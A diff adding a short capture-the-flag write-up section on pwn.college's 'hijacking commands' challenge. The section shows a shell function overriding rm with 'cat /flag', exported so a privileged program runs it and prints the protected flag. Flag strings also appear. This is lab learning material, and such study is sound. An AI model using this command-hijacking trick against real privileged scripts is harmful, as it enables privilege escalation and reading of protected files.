@@ -36,3 +36,15 @@ Hello cryptonite people, I got the flag :D
 pwn.college{Y7xl-Eg55R7B5snhHbaoRFt0B0L.dZzNyUDLxUjN0czW}
 hacker@path~adding-commands:~$ 
 ```
+
+### Hijacking commands
+Decided to do the last challenge in a bit of an interesting way, we define a `rm` function with contents `cat /flag` as this will be ran with elevated permissions and we'll get the contents of `/flag`, then we use `export` with flag `-f` to export the function so that subprocesses could use it (we need that for `/challenge/run` to find our custom function rather than the real one).
+```bash
+hacker@path~hijacking-commands:~$ rm() { cat /flag; }
+hacker@path~hijacking-commands:~$ export -f rm
+hacker@path~hijacking-commands:~$ /challenge/run
+Trying to remove /flag...
+Found 'rm' command at /usr/bin/rm. Executing!
+pwn.college{oSaQ5v7R4vc_4NDsgHC7hvapcev.ddzNyUDLxUjN0czW}
+hacker@path~hijacking-commands:~$ 
+```
